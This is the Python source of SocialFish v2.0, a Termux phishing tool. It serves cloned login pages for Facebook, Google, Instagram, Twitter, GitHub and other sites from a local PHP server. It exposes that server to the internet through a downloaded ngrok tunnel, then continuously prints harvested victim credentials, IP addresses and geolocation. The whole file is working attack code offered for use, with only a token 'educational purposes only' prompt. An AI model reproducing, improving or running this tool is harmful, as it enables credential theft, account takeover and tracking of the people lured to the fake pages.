#!/usr/bin/python2.7
#-*- coding: utf-8 -*-
#   SOCIALFISH v2.0
#     by: An0nUD4Y
#
# TERMUX VERSION OF SOCIALFISH
###############################
from time import sleep
from sys import stdout, exit
from os import system, path
import multiprocessing
from urllib import urlopen
from platform import architecture
from wget import download

RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print '''
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|           
                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
                    {0}[{1}!{0}]{1} By--------------> An0nUD4Y \n
'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('ServerTermux/ngrok') == False: 
        print '[*] Downloading Ngrok...'
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            filename = 'ngrok-stable-linux-arm.zip'
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok ServerTermux/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end():
    system('clear')
    print '''
                   S O C I A L{2} 
              |\    \ \ \ \ \ \ \      __           ___
              |  \    \ \ \ \ \ \ \   | O~-_    _-~~   ~~-_
              |   >----|-|-|-|-|-|-|--|  __/   /   {1}DON'T{2}   )
              |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
              |/     / / / / / / /             \_   {1}ME !{2}  _)
                          {1}F I S H{2}                ~--___--~
               {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
{1}[ {0} Some more phising pages have been added in script. For a better Attack]
[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(GREEN, END, CYAN)

def loadModule(module):
       print '''{0}
   _.-=-._     .-, 
 .'       "-.,' / 
( AnonUD4Y  _.  < 
 `=.____.="  `._\\


 [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module

def runPhishing(social, option2):
    system('rm -Rf ServerTermux/www/*.* && touch ServerTermux/www/usernames.txt && touch ServerTermux/www/iplog.txt')
    if option2 == '1' and social == 'Facebook':
        system('cp WebPagesTermux/fb_standard/*.* ServerTermux/www/')
    if option2 == '2' and social == 'Facebook':
        system('cp WebPagesTermux/fb_advanced_poll/*.* ServerTermux/www/')  
    if option2 == '3' and social == 'Facebook':
        system('cp WebPagesTermux/mobile_fb/*.* ServerTermux/www/')   
    if option2 == '4' and social == 'Facebook':
        system('cp WebPagesTermux/fb_security_fake/*.* ServerTermux/www/')  
    if option2 == '5' and social == 'Facebook':
        system('cp WebPagesTermux/fb_messenger/*.* ServerTermux/www/')         
    elif option2 == '1' and social == 'Google':
        system('cp WebPagesTermux/google_standard/*.* ServerTermux/www/')
    elif option2 == '2' and social == 'Google':
        system('cp WebPagesTermux/google_advanced_poll/*.* ServerTermux/www/')
    elif option2 == '3' and social == 'Google':
        system('cp WebPagesTermux/google_advanced_web/*.* ServerTermux/www/')	
    elif social == 'LinkedIn':
        system('cp WebPagesTermux/linkedin/*.* ServerTermux/www/')
    elif social == 'GitHub':
        system('cp WebPagesTermux/GitHub/*.* ServerTermux/www/')
    elif social == 'StackOverflow':
        system('cp WebPagesTermux/stackoverflow/*.* ServerTermux/www/')
    elif social == 'WordPress':
        system('cp WebPagesTermux/wordpress/*.* ServerTermux/www/')
    elif social == 'Twitter':
        system('cp WebPagesTermux/twitter/*.* ServerTermux/www/')
    elif social == 'Snapchat':
        system('cp WebPagesTermux/Snapchat_web/*.* ServerTermux/www/')
    elif social == 'Yahoo':
        system('cp WebPagesTermux/yahoo_web/*.* ServerTermux/www/')    	
    elif option2 == '1' and social == 'Instagram':
        system('cp WebPagesTermux/Instagram_web/*.* ServerTermux/www/')
    elif option2 == '2' and social == 'Instagram':
        system('cp WebPagesTermux/Instagram_autoliker/*.* ServerTermux/www/')
        
def waitCreds():
    print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.... Start HAcking ".format(RED, END) 
  
    print '''{0}
   _.-=-._     .-, 
 .'       "-.,' / 
(  AnonUD4Y_  ~.< 
 `=.____.="  `._\\ 
 
 [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION . 
 [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, CITY, COUNTRY, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
   
    print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
    while True:
        with open('ServerTermux/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print '================================================='.format(RED, END)
            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf ServerTermux/www/usernames.txt && touch ServerTermux/www/usernames.txt')
            print '================================================='.format(RED, END)
            print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
            
        creds.close()
        with open('ServerTermux/www/iplog.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print '================================================='.format(RED, END)
            print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf ServerTermux/www/iplog.txt && touch ServerTermux/www/iplog.txt')
            print '================================================='.format(RED, END)
           
        creds.close()

def runPEnv():
    system('clear')
    print '''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
                       .   .  . 
                 .  '  .        '                        '
             '             '      '                   '   '
  ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██ 
  ██      ██    ██ ██      ██ ██   ██ ██       ██      ██ ██      ██   ██ 
  ███████ ██    ██ ██      ██ ███████ ██       █████   ██ ███████ ███████ 
       ██ ██    ██ ██      ██ ██   ██ ██       ██      ██      ██ ██   ██ 
  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██ 
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  {1}v2.0{2} 
               '  .  .  .  .  . '.    .'              '  .
                   '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}    
                     '        {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]      
                       ' .  '
                           '
                             {1}'''.format(GREEN, END, CYAN)

    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, END) % i)
        stdout.flush()
   
    print "\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, END) 
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(CYAN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
        exit(0)
    if raw_input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF-An0nUD4Y > {1}".format(RED, END, CYAN)).upper() != 'Y':
        system('clear')
        print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END)
        exit(0)
    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
    if option == '1':
        loadModule('Facebook')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Mobile Version(mobile_mode)\n\n {0}[{1}4{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}5{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '4':
        loadModule('GitHub')
        option2 = ''
        runPhishing('GitHub', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '7':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    elif option == '8':
        loadModule('Instagram')
        option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n  {0}SF-An0nUD4Y > {1}".format(CYAN, END))
        runPhishing('Instagram', option2)
    elif option == '9':
        loadModule('Snapchat')
        option2 = ''
        runPhishing('Snapchat', option2)
    elif option == '10':
        loadModule('Yahoo')
        option2 = ''
        runPhishing('Yahoo', option2)    
    else:
        exit(0)

def runNgrok():
    system('./ServerTermux/ngrok http 8080 > /dev/null &')
    sleep(10)
    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrokTermux.url')
    url = open('ngrokTermux.url', 'r')
    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
    url.close()

def runServerTermux():
    system("cd ServerTermux/www/ && php -S 127.0.0.1:8080")

if __name__ == "__main__":
    try:
        runPEnv()
        runNgrok()
        multiprocessing.Process(target=runServerTermux).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
